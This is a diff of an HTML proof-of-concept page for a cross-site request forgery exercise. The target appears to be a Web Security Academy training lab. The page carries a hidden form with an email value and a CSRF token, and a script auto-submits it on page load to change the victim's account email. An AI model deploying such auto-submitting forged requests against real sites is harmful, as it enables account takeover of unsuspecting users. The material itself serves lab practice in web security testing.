@@ -2,15 +2,18 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CSRF PoC</title>
 </head>
 <body>
-    <h1>CSRF PoC</h1>
-    <form action="https://0a7400a20358cc0f83ea388900ba0008.web-security-academy.net/my-account/change-email" method="POST">
-        <input type="hidden" name="email" value="awyea1652@gmail.com">
+    <form action="https://0a5f002504b567be8133dec1008f00a6.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="aabbnotwinneccrrr%40normal-user.net">
+        <input type="hidden" name="csrf" value="0IYzExVgOCxlGZjsNVhms1bAOSJtE6IB">
     </form>
+
     <script>
-        // Automatically submit the form when the page loads
+        // Automatically submit the form
         document.forms[0].submit();
     </script>
 </body>
